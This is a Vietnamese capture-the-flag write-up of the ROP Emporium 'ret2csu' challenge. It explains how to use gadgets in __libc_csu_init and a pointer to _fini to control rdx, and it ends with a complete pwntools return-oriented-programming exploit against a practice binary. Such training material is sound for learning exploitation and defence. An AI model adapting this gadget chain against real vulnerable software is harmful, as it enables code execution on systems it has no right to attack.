# ret2csu - challenge 8

[For more](https://stackoverflow.com/questions/61649960/why-do-program-level-constructors-get-called-by-libc-csu-init-but-destructor)

Thì chall này, tương tự như call me(with 3 args), có điều là chúng ta sẽ bị thiếu gadgets do đó cần ret2csu. với các gadgets hữu ích trong **__libc_csu_init** thì hàm này tồn tại do ta dynamic link, tức có đính kém thư viện liên kết thì file mới chạy được.

```asm
pwndbg> disass __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   0x0000000000400640 <+0>:     push   r15
   0x0000000000400642 <+2>:     push   r14
   0x0000000000400644 <+4>:     mov    r15,rdx
   0x0000000000400647 <+7>:     push   r13
   0x0000000000400649 <+9>:     push   r12
   0x000000000040064b <+11>:    lea    r12,[rip+0x20079e]        # 0x600df0
   0x0000000000400652 <+18>:    push   rbp
   0x0000000000400653 <+19>:    lea    rbp,[rip+0x20079e]        # 0x600df8
   0x000000000040065a <+26>:    push   rbx
   0x000000000040065b <+27>:    mov    r13d,edi
   0x000000000040065e <+30>:    mov    r14,rsi
   0x0000000000400661 <+33>:    sub    rbp,r12
   0x0000000000400664 <+36>:    sub    rsp,0x8
   0x0000000000400668 <+40>:    sar    rbp,0x3
   0x000000000040066c <+44>:    call   0x4004d0 <_init>
   0x0000000000400671 <+49>:    test   rbp,rbp
   0x0000000000400674 <+52>:    je     0x400696 <__libc_csu_init+86>
   0x0000000000400676 <+54>:    xor    ebx,ebx
   0x0000000000400678 <+56>:    nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000400680 <+64>:    mov    rdx,r15
   0x0000000000400683 <+67>:    mov    rsi,r14
   0x0000000000400686 <+70>:    mov    edi,r13d
   0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x000000000040068d <+77>:    add    rbx,0x1
   0x0000000000400691 <+81>:    cmp    rbp,rbx
   0x0000000000400694 <+84>:    jne    0x400680 <__libc_csu_init+64>
   0x0000000000400696 <+86>:    add    rsp,0x8
   0x000000000040069a <+90>:    pop    rbx
   0x000000000040069b <+91>:    pop    rbp
   0x000000000040069c <+92>:    pop    r12
   0x000000000040069e <+94>:    pop    r13
   0x00000000004006a0 <+96>:    pop    r14
   0x00000000004006a2 <+98>:    pop    r15
   0x00000000004006a4 <+100>:   ret

```

Ta thấy có 2 gadgets hữu ích là:

```asm
#gadget1
   0x0000000000400680 <+64>:    mov    rdx,r15
   0x0000000000400683 <+67>:    mov    rsi,r14
   0x0000000000400686 <+70>:    mov    edi,r13d
   0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]


#gadget2
   0x000000000040069a <+90>:    pop    rbx
   0x000000000040069b <+91>:    pop    rbp
   0x000000000040069c <+92>:    pop    r12
   0x000000000040069e <+94>:    pop    r13
   0x00000000004006a0 <+96>:    pop    r14
   0x00000000004006a2 <+98>:    pop    r15
   0x00000000004006a4 <+100>:   ret

```

Thì với gadget1 ta có thể control 3 regs rdi,rsi,rdx, tuy nhiên thứ ta cần để tâm chỉ là thanh ghi rdx, bởi ta đã có 2 gadgets khác cho rdi và rsi :

```shell
0x00000000004006a3 : pop rdi ; ret
0x00000000004006a1 : pop rsi ; pop r15 ; ret

```

**mov edi, r13d** :

|64-bit register | Lower 32 bits | Lower 16 bits | Lower 8 bits|
|---------|------|------|------|
rax             | eax           | ax            | al
rbx             | ebx           | bx            | bl
rcx             | ecx           | cx            | cl
rdx             | edx           | dx            | dl
rsi             | esi           | si            | sil
rdi             | edi           | di            | dil
rbp             | ebp           | bp            | bpl
rsp             | esp           | sp            | spl
r8              | r8d           | r8w           | r8b
r9              | r9d           | r9w           | r9b
r10             | r10d          | r10w          | r10b
r11             | r11d          | r11w          | r11b
r12             | r12d          | r12w          | r12b
r13             | r13d          | r13w          | r13b
r14             | r14d          | r14w          | r14b
r15             | r15d          | r15w          | r15b


Thì kịch bản khai thác sẽ là **ret** về gadget thứ 2, sau đó set các thanh ghi sau cho:

- rbx = 0, để khi thực hiện **call   QWORD PTR [r12+rbx*8]** sẽ để r12 có thể độc lập xác định con trỏ gọi hàm 
- rbp = 1, để khi cmp thì bypass được việc phải quay lại vòng lặp
- r12 = pointer point to **fini**
- r13 = 0
- r14 = 0
- r15 = *0xd00df00dd00df00d*


Sau khi call xong gadget2 thì có lệnh ret, sau đó là gadget1, set up các regs như ý mình, còn nữa 1 vấn đề ở lệnh call. ta phải call đến hàm nào mà k thay đổi các giá trị của thanh ghi rdx, chính là fini:

```asm
pwndbg> disass _fini
Dump of assembler code for function _fini:
   0x00000000004006b4 <+0>:     sub    rsp,0x8
   0x00000000004006b8 <+4>:     add    rsp,0x8
   0x00000000004006bc <+8>:     ret

```

Cơ mà vấn đề bây giờ là cần tìm pointer point to **_fini**:

```shell➜ chall8_ret2csu ⚡                                                13:59:22
▶ r2 ret2csu
 -- r2 talks to you. tries to make you feel well.
[0x00400520]> iS~.dynamic
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
[0x00400520]> pxQ@0x00600e00
0x00600e00 0x0000000000000001 section.+1
0x00600e08 0x0000000000000001 section.+1
0x00600e10 0x0000000000000001 section.+1
0x00600e18 0x0000000000000038 section.+56
0x00600e20 0x000000000000001d section.+29
0x00600e28 0x0000000000000078 elf_phdr+56
0x00600e30 0x000000000000000c section.+12
0x00600e38 0x00000000004004d0 section..init
0x00600e40 0x000000000000000d section.+13
0x00600e48 0x00000000004006b4 section..fini
0x00600e50 0x0000000000000019 section.+25
0x00600e58 0x0000000000600df0 section..init_array
0x00600e60 0x000000000000001b section.+27
0x00600e68 0x0000000000000008 section.+8
0x00600e70 0x000000000000001a section.+26
0x00600e78 0x0000000000600df8 section..fini_array
0x00600e80 0x000000000000001c section.+28
0x00600e88 0x0000000000000008 section.+8
0x00600e90 0x000000006ffffef5
0x00600e98 0x0000000000400298 section..gnu.hash
0x00600ea0 0x0000000000000005 section.+5
0x00600ea8 0x00000000004003c0 section..dynstr
0x00600eb0 0x0000000000000006 section.+6
0x00600eb8 0x00000000004002d0 section..dynsym
0x00600ec0 0x000000000000000a section.+10
0x00600ec8 0x000000000000007a elf_phdr+58
0x00600ed0 0x000000000000000b section.+11
0x00600ed8 0x0000000000000018 section.+24
0x00600ee0 0x0000000000000015 section.+21
0x00600ee8 0x0000000000000000 section.
0x00600ef0 0x0000000000000003 section.+3
0x00600ef8 0x0000000000601000 section..got.plt


```

Như đã thấy thì : ***0x00600e48 0x00000000004006b4 section..fini***

### exploit

```python
from pwn import *

r = process("./ret2csu")
payload = b""
# gdb.attach(r, api=True)

payload += b"a"*40 #padding
payload += p64(0x40069a) #gadget2
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(0x600e48) # point to fini_funct
payload += p64(0) # r13
payload += p64(0) # r14
payload += p64(0xd00df00dd00df00d) # r15
payload += p64(0x400680) # gadget1
payload += p64(0) * 7 # 6 + 1 for bypass:  add rsp,0x8
payload += p64(0x4006a3) # pop rdi ; ret
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0x4006a1) #  pop rsi ; pop r15 ; ret
payload += p64(0xcafebabecafebabe)  # rsi
payload += p64(0) # r15
payload += p64(0x4004e6) # ret
payload += p64(0x400510) # ret2win
r.sendline(payload)

r.interactive()


```